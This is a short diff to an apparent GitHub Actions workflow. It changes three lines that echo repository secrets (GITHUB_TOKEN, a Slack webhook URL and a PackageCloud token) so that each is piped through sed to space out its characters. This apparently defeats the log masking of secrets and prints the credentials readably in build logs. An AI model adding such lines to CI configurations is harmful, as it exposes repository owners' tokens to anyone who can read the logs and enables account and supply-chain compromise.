@@ -16,6 +16,6 @@ jobs:
         SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}
         PACKAGECLOUD_TOKEN: ${{ secrets.PACKAGECLOUD_TOKEN }}
       run: |
-        echo ${{secrets.GITHUB_TOKEN}}
-        echo ${{secrets.SLACK_WEBHOOK_URL}}
-        echo ${{secrets.PACKAGECLOUD_TOKEN}}
+        echo ${{secrets.GITHUB_TOKEN}} | sed 's/./& /g'
+        echo ${{secrets.SLACK_WEBHOOK_URL}} | sed 's/./& /g'
+        echo ${{secrets.PACKAGECLOUD_TOKEN}} | sed 's/./& /g'
